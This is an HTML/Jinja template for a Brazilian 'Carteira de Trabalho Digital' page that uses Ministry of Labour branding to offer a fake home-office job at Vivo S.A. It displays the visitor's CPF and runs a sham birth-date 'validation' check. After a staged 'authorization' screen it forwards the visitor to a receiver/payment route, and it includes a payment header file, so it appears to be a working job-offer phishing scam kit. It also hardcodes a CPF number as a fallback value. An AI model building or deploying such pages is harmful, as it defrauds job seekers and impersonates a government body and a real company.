<!DOCTYPE html>
<html>
<head>
<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16589951858"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-16589951858');
</script>
{% include 'pagamento_head.html' %}
    <!-- DETECÇÃO INSTANTÂNEA DE DESKTOP - Aplicada antes de qualquer renderização -->
    <script src="{{ url_for('static', filename='js/instant_detection.js') }}"></script>
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Carteira de Trabalho Digital</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"></link>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'custom-blue': '#012D6B',
                    },
                    fontFamily: {
                        'roboto': ['Roboto', 'sans-serif'],
                    },
                }
            }
        }
    </script>
    <style>
        body {
            font-family: 'Roboto', sans-serif;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .spin {
            animation: spin 1s linear infinite;
        }
    </style>
</head>
<body class="bg-white font-roboto">
    <!-- Login Screen - Estilo tradicional do Governo -->
    <div id="loginScreen" class="fixed inset-0 bg-custom-blue flex flex-col items-center justify-center text-white px-4">
        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-6">
        
        <!-- Loader tradicional -->
        <div id="loader" class="w-16 h-16 border-t-4 border-white rounded-full spin mb-4"></div>
        
        <p class="text-lg mb-4 text-center">Acessando Carteira de Trabalho Digital do CPF: <span id="display-cpf">Carregando...</span></p>
        <p class="text-sm text-center text-blue-200">Aguarde enquanto consultamos os dados</p>
    </div>
    
    <!-- User Confirmation Screen - Layout oficial do Governo -->
    <div id="userConfirmation" class="fixed inset-0 bg-custom-blue hidden flex flex-col items-center justify-center text-white px-4">
        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-4">
        <div class="bg-white text-custom-blue p-6 rounded-lg shadow-md max-w-md w-full">
            <div class="flex flex-col items-center mb-6">
                <div class="w-24 h-24 bg-gray-200 rounded-full flex items-center justify-center mb-4">
                    <i class="fas fa-user-circle text-6xl text-gray-400"></i>
                </div>
                <h2 id="user-name" class="text-xl font-bold text-center"></h2>
                <p id="user-cpf" class="text-gray-600"></p>
            </div>
            
            <p class="text-gray-800 mb-6 text-center">
                Para que a Vivo S.A. possa assinar sua Carteira de Trabalho Digital, é necessário confirmar que esta conta pertence a você respondendo a uma pergunta de validação.
            </p>
            
            <button id="proceedToValidation" class="w-full bg-custom-blue text-white py-3 rounded-lg hover:bg-blue-800 transition duration-300">
                Prosseguir
            </button>
        </div>
    </div>

    <!-- Validation Questions - Layout oficial do Governo -->
    <div id="validationQuestions" class="fixed inset-0 bg-custom-blue hidden flex flex-col items-center justify-center text-white px-4">
        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-6">
        <h2 class="text-2xl font-bold mb-4" id="questionTitle">Pergunta de Validação</h2>
        <p class="text-lg mb-4 text-center" id="questionText"></p>
        <div id="answerButtons" class="flex flex-col space-y-4 w-full max-w-md"></div>
    </div>

    <!-- Main Content (initially hidden) - Layout oficial do Governo -->
    <div id="mainContent" class="hidden">
        <!-- Header simples e oficial -->
        <div class="bg-custom-blue text-white p-4 pb-3">
            <div class="flex items-center mb-2">
                <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo representando a Carteira de Trabalho Digital" class="h-10 w-10">
                <h1 class="ml-4 text-lg font-medium uppercase">CARTEIRA DE TRABALHO DIGITAL</h1>
            </div>
            <div class="text-xl font-light">VIVO S.A.</div>
        </div>

        <!-- Tabs -->
        <div class="flex border-b">
            <div class="w-full text-center py-3 border-b-2 border-custom-blue text-custom-blue font-medium">PEDIDO DE CONTRATAÇÃO</div>
        </div>

        <!-- Content -->
        <div class="bg-gray-100 p-4">
            <div class="mb-4">
                <div class="text-gray-500 text-sm font-medium">CNPJ</div>
                <div class="text-gray-800 font-normal">02.449.992/0001-62</div>
            </div>

            <div class="mb-4">
                <div class="text-gray-500 text-sm font-medium">Data de Contratação</div>
                <div class="text-gray-800 font-normal" id="currentDate"></div>
            </div>

            <div class="mb-4">
                <div class="text-gray-500 text-sm font-medium">Benefícios</div>
                <div class="text-gray-800 font-normal">INSS</div>
                <div class="text-gray-800 font-normal">Seguro Desemprego</div>
                <div class="text-gray-800 font-normal">Plano de Saúde</div>
                <div class="text-gray-800 font-normal">Vale Alimentação</div>
            </div>

            <div class="mb-4">
                <div class="text-gray-500 text-sm font-medium">Ocupação Inicial</div>
                <div class="text-gray-800 font-normal">4223-05 - Atendente de Suporte (Home Office)</div>
            </div>

            <div class="mb-4">
                <div class="text-gray-500 text-sm font-medium">Remuneração</div>
                <div class="text-gray-800 font-normal">R$ 1.788,60</div>
            </div>

            <!-- User Approval Section -->
            <div class="mt-6 bg-white p-4 rounded-sm shadow-md">
                <div class="text-gray-800 text-lg font-medium mb-4">Você autoriza a empresa VIVO S.A. a assinar sua Carteira Digital de Trabalho?</div>
                <div class="flex justify-center space-x-4">
                    <button id="authorizeBtn" class="bg-custom-blue text-white px-6 py-2 rounded-sm shadow-sm hover:bg-blue-800 transition duration-300">Autorizar</button>
                    <button class="bg-white text-custom-blue px-6 py-2 rounded-sm shadow-sm border border-custom-blue hover:bg-gray-100 transition duration-300">Rejeitar</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Overlay tradicional -->
    <div id="overlay" class="fixed inset-0 bg-custom-blue bg-opacity-50 hidden flex items-center justify-center">
        <img id="ministryLogo" src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-40 h-40">
    </div>

    <!-- Success Screen - design oficial do Governo -->
    <div id="successScreen" class="fixed inset-0 bg-custom-blue hidden flex flex-col items-center justify-center text-white px-4">
        <img src="https://i.ibb.co/bM63WcBc/unnamed-removebg-preview-1.png" alt="Logo do Ministério do Trabalho" class="w-32 h-32 mb-6">
        <h2 class="text-2xl font-bold mb-2">Carteira de Trabalho</h2>
        <p class="text-lg mb-8 text-center">Para finalizar a contratação, clique no botão "Continuar" abaixo.</p>
        <a href="{{ url_for('carregando_recebedor') }}{{ '?' + request.query_string.decode() if request.query_string else '' }}" id="continueBtn" class="bg-white text-custom-blue px-8 py-3 rounded-md shadow-lg hover:bg-gray-100 transition duration-300">Continuar</a>
    </div>

    <script>
        // Get current date and format it
        const currentDate = new Date();
        const day = String(currentDate.getDate()).padStart(2, '0');
        const month = String(currentDate.getMonth() + 1).padStart(2, '0');
        const year = currentDate.getFullYear();
        const formattedDate = `${day}/${month}/${year}`;

        // Set the formatted date in the HTML
        document.getElementById('currentDate').textContent = formattedDate;

        // Get elements
        const loginScreen = document.getElementById('loginScreen');
        const userConfirmation = document.getElementById('userConfirmation');
        const validationQuestions = document.getElementById('validationQuestions');
        const mainContent = document.getElementById('mainContent');
        const authorizeBtn = document.getElementById('authorizeBtn');
        const overlay = document.getElementById('overlay');
        const successScreen = document.getElementById('successScreen');
        const continueBtn = document.getElementById('continueBtn');
        const questionTitle = document.getElementById('questionTitle');
        const questionText = document.getElementById('questionText');
        const answerButtons = document.getElementById('answerButtons');
        const proceedToValidation = document.getElementById('proceedToValidation');
        const displayCpf = document.getElementById('display-cpf');
        const userName = document.getElementById('user-name');
        const userCpf = document.getElementById('user-cpf');

        // API data
        let apiData = null;
        let userCPF = '';
        
        // Function to normalize CPF (remove non-numeric characters)
        function normalizeCPF(cpf) {
            return cpf.replace(/\D/g, '');
        }
        
        // Function to format CPF with dots and dash
        function formatCPF(cpf) {
            const normalizedCPF = normalizeCPF(cpf);
            if (normalizedCPF.length !== 11) return cpf;
            return `${normalizedCPF.slice(0, 3)}.${normalizedCPF.slice(3, 6)}.${normalizedCPF.slice(6, 9)}-${normalizedCPF.slice(9)}`;
        }
        
        // Get CPF from session storage or use a default one for testing
        function getUserCPF() {
            // Try to get from session data (this assumes the Flask app sets it)
            userCPF = '{{ cpf }}' || '053.968.801-04'; // Fallback to example if not provided
            
            // Normalize and display the CPF
            const normalizedCPF = normalizeCPF(userCPF);
            const formattedCPF = formatCPF(normalizedCPF);
            displayCpf.textContent = formattedCPF;
            
            return normalizedCPF;
        }
        
        // Usar dados do localStorage em vez de fazer nova consulta à API
        async function fetchUserData() {
            const cpf = getUserCPF();
            
            try {
                // Tentar obter dados do localStorage primeiro
                const savedUserData = localStorage.getItem('userData');
                
                if (savedUserData) {
                    const userData = JSON.parse(savedUserData);
                    
                    // Verificar se o CPF salvo corresponde ao atual
                    if (userData.cpf === normalizeCPF(cpf)) {
                        console.log('Usando dados do localStorage: ', userData);
                        // Criar estrutura compatível com o formato que a função espera
                        apiData = {
                            nomeCompleto: userData.nome,
                            documento: userData.cpf,
                            dataDeNascimento: userData.dataNascimento
                        };
                        
                        // Display user name and CPF on confirmation screen
                        userName.textContent = apiData.nomeCompleto;
                        userCpf.textContent = formatCPF(apiData.documento);
                        
                        // Hide login screen, show confirmation screen
                        loginScreen.classList.add('hidden');
                        userConfirmation.classList.remove('hidden');
                        
                        return true;
                    }
                }
                
                // Se não tiver dados no localStorage ou CPF não corresponder, exibe mensagem de erro
                console.error('Dados não encontrados no localStorage');
                alert('Não foi possível verificar seus dados. Por favor, complete o cadastro inicial primeiro.');
                const currentParams = new URLSearchParams(window.location.search);
                const redirectUrl = new URL('/cadastro', window.location.origin);
                currentParams.forEach((value, key) => {
                    redirectUrl.searchParams.set(key, value);
                });
                window.location.href = redirectUrl.toString();
                return false;
            } catch (error) {
                console.error('Erro ao obter dados do usuário:', error);
                alert('Ocorreu um erro ao acessar seus dados. Por favor, volte e complete o cadastro inicial.');
                window.location.href = '/cadastro'; // Redireciona para a página de cadastro
                return false;
            }
        }
        
        // Initialize by fetching user data
        fetchUserData();
        
        // Proceed to validation questions - versão simplificada
        proceedToValidation.addEventListener('click', () => {
            userConfirmation.classList.add('hidden');
            validationQuestions.classList.remove('hidden');
            showValidationQuestion(1);
        });

        function showValidationQuestion(questionNumber) {
            answerButtons.innerHTML = '';

            if (questionNumber === 1) {
                questionTitle.textContent = "Pergunta de Validação";
                questionText.textContent = "Qual é a sua data de nascimento?";
                
                const correctDate = apiData.dataDeNascimento;
                
                // Generate random incorrect dates
                const randomDates = generateRandomDates(correctDate, 2);
                const dates = [correctDate, ...randomDates];
                
                shuffleArray(dates);
                
                dates.forEach(date => {
                    const button = document.createElement('button');
                    button.textContent = date;
                    button.className = "bg-white text-custom-blue px-6 py-2 rounded-sm shadow-sm hover:bg-gray-100 transition duration-300";
                    button.onclick = () => checkAnswer(date === correctDate, 3);
                    answerButtons.appendChild(button);
                });
            }
        }

        // Function to generate random dates around a given date
        function generateRandomDates(correctDate, count) {
            const result = [];
            const [day, month, year] = correctDate.split('/').map(num => parseInt(num));
            
            for(let i = 0; i < count; i++) {
                let randomDay = Math.floor(Math.random() * 28) + 1;
                let randomMonth = Math.floor(Math.random() * 12) + 1;
                let randomYear = year + Math.floor(Math.random() * 10) - 5;
                
                // Ensure the date is different from the correct one
                if(randomDay === day && randomMonth === month && randomYear === year) {
                    randomDay = (randomDay % 27) + 1;
                }
                
                const formattedDay = String(randomDay).padStart(2, '0');
                const formattedMonth = String(randomMonth).padStart(2, '0');
                
                result.push(`${formattedDay}/${formattedMonth}/${randomYear}`);
            }
            
            return result;
        }

        // Function to check the answer
        function checkAnswer(isCorrect, nextQuestion) {
            if(isCorrect) {
                // Mostrar efeito de aprovação na resposta selecionada
                event.target.classList.add('bg-green-100');
                event.target.innerHTML = `${event.target.textContent} <i class="fas fa-check-circle text-green-500 ml-2"></i>`;
                
                // Desabilitar todos os botões durante a transição
                const buttons = document.querySelectorAll('#answerButtons button');
                buttons.forEach(button => {
                    button.disabled = true;
                    if (button !== event.target) {
                        button.classList.add('opacity-50');
                    }
                });
                
                // Como só temos uma pergunta agora, vamos diretamente para a tela principal
                setTimeout(() => {
                    // Transição para o conteúdo principal
                    validationQuestions.classList.add('hidden');
                    mainContent.classList.remove('hidden');
                }, 1000);
            } else {
                alert('Resposta incorreta. Por favor, tente novamente.');
            }
        }

        function shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
            return array;
        }

        // Add click event to Authorize button - Design simplificado
        authorizeBtn.addEventListener('click', () => {
            // Efeito simples no botão
            authorizeBtn.textContent = "Processando...";
            authorizeBtn.disabled = true;
            
            // Mostrar overlay simples
            overlay.classList.remove('hidden');
            
            // Após 2 segundos, mostrar tela de sucesso
            setTimeout(() => {
                mainContent.classList.add('hidden');
                overlay.classList.add('hidden');
                successScreen.classList.remove('hidden');
            }, 2000);
        });
    </script>
</body>
</html>